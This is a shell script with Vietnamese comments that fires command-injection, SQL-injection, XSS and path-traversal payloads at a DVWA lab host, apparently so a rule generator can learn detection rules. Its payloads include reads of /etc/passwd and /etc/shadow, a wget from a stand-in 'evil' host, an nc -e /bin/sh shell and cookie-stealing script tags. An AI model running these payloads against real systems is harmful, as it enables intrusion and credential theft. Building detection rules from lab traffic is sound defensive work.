#!/bin/sh
# Payload cho demo sinh NHIỀU luật — mỗi họ có một bất biến đặc hiệu nằm trong GIÁ TRỊ tham số
# (rulegen trích từ giá trị, không từ URL) và không có trong corpus lành tính.
#   dùng (trong container): sh /tools/ruleatk.sh [rce|sqli|xss|lfi|all]
T="${T:-http://10.10.10.10}"

rce_rule(){  # luật kỳ vọng: @rx dấu nối lệnh + tên lệnh, đích ARGS:ip — payload trong THÂN POST
  for v in "127.0.0.1;cat /etc/passwd" "127.0.0.1;cat /etc/shadow" \
           "127.0.0.1;wget http://evil/x" "127.0.0.1;uname -a" "127.0.0.1;nc -e /bin/sh"; do
    curl -s -o /dev/null -H "Host: ${NSM_HOST:-dvwa.local}" --data-urlencode "ip=$v" --data-urlencode "Submit=Submit" "$T/vulnerabilities/exec/"; done; }

sqli_rule(){ # bất biến kỳ vọng: "' union select", đích ARGS:id
  for v in "1' union select 1,2-- -" "1' union select user,pass-- -" \
           "1' union select null,version()-- -" "1' union select table_name,2 from dual-- -" \
           "1' union select 3,4-- -"; do
    curl -s -o /dev/null -H "Host: ${NSM_HOST:-dvwa.local}" -G "$T/vulnerabilities/sqli/" --data-urlencode "id=$v" --data-urlencode "Submit=Submit"; done; }

xss_rule(){  # bất biến kỳ vọng: phần chung của thẻ script, đích ARGS:name
  for v in "<script>alert(1)</script>" "<script>alert(document.cookie)</script>" \
           "<script>alert(2)</script>" "<script>prompt(1)</script>" "<script>confirm(3)</script>"; do
    curl -s -o /dev/null -H "Host: ${NSM_HOST:-dvwa.local}" -G "$T/vulnerabilities/xss_r/" --data-urlencode "name=$v"; done; }

lfi_rule(){  # bất biến kỳ vọng: "/etc/passwd", đích ARGS:page
  for v in "../../../../etc/passwd" "../../../etc/passwd" "../../etc/passwd" \
           "....//....//etc/passwd" "/var/www/../../etc/passwd"; do
    curl -s -o /dev/null -H "Host: ${NSM_HOST:-dvwa.local}" -G "$T/vulnerabilities/fi/" --data-urlencode "page=$v"; done; }

case "${1:-all}" in
  rce) rce_rule;; sqli) sqli_rule;; xss) xss_rule;; lfi) lfi_rule;;
  all) rce_rule; sqli_rule; xss_rule; lfi_rule;;
  *) echo "họ không hợp lệ: $1" >&2; exit 2;;
esac
